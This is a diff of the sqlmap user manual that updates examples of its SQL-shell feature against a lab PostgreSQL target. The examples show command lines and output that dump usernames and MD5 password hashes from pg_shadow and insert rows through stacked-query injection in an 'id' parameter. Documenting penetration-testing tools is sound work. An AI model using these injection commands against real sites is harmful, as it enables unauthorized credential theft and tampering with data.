@@ -3448,7 +3448,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql
   "SELECT usename FROM pg_user" -v 0
 
 [hh:mm:32] [INPUT] can the SQL query provided return multiple entries? [Y/n] y
-[hh:mm:37] [INPUT] the SQL query provided can return up to 2 entries. How many entries 
+[hh:mm:37] [INPUT] the SQL query provided can return up to 3 entries. How many entries 
 do you want to retrieve?
 [a] All (default)
 [#] Specific number
@@ -3544,11 +3544,10 @@ do you want to retrieve?
 [a] All (default)
 [#] Specific number
 [q] Quit
-Choice: 
+Choice: 2
 SELECT usename, passwd FROM pg_shadow ORDER BY usename [3]:
 [*] postgres, md5d7d880f96044b72d0bba108ace96d1e4
 [*] testuser, md599e5ea7a6f7c3269995cba3927fd0093
-[*] testuser2, 
 </verb></tscreen>
 
 <p>
@@ -3686,19 +3685,40 @@ column names of the table then asks if the query can return multiple
 entries and goes on.
 
 <p>
-Example of SQL statement other than <tt>SELECT</tt> on an <bf>Oracle XE
-10.2.0.1</bf> target:
+Example of SQL statement other than <tt>SELECT</tt> on a <bf>PostgreSQL
+8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --sql-shell -v 1
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-shell -v 1
 
 [...]
-back-end DBMS: Oracle
+back-end DBMS: PostgreSQL
 
-[hh:mm:20] [INFO] calling Oracle shell. To quit type 'x' or 'q' and press ENTER
-sql> TODO
+[10:11:42] [INFO] calling PostgreSQL shell. To quit type 'x' or 'q' and press ENTER
+sql> SELECT COUNT(name) FROM users
+[10:11:57] [INFO] fetching SQL SELECT statement query output: 'SELECT COUNT(name) FROM users'
+[10:11:57] [INPUT] can the SQL query provided return multiple entries? [Y/n] n
+[10:11:59] [INFO] query: SELECT COALESCE(CAST(COUNT(name) AS CHARACTER(10000)), CHR(32)) FROM users
+[10:11:59] [INFO] retrieved: 4
+[10:11:59] [INFO] performed 13 queries in 0 seconds
+SELECT COUNT(name) FROM users:    '4'
+
+sql> INSERT INTO users (id, name, surname) VALUES (5, 'from', 'sql shell');
+[10:12:35] [INFO] testing stacked queries support on parameter 'id'
+[10:12:40] [INFO] the web application supports stacked queries on parameter 'id'
+[10:12:40] [INFO] executing SQL data manipulation query: 'INSERT INTO users (id, name, surname) VALUES (5, 'from', 'sql shell');'
+[10:12:40] [INFO] done
+sql> SELECT COUNT(name) FROM users
+[10:12:51] [INFO] fetching SQL SELECT statement query output: 'SELECT COUNT(name) FROM users'
+[10:12:51] [INPUT] can the SQL query provided return multiple entries? [Y/n] n
+[10:12:53] [INFO] query: SELECT COALESCE(CAST(COUNT(name) AS CHARACTER(10000)), CHR(32)) FROM users
+[10:12:53] [INFO] retrieved: 5
+[10:12:54] [INFO] performed 20 queries in 0 seconds
+SELECT COUNT(name) FROM users:    '5'
 </verb></tscreen>
 
+<p>
+TODO
 
 
 <sect1>File system access
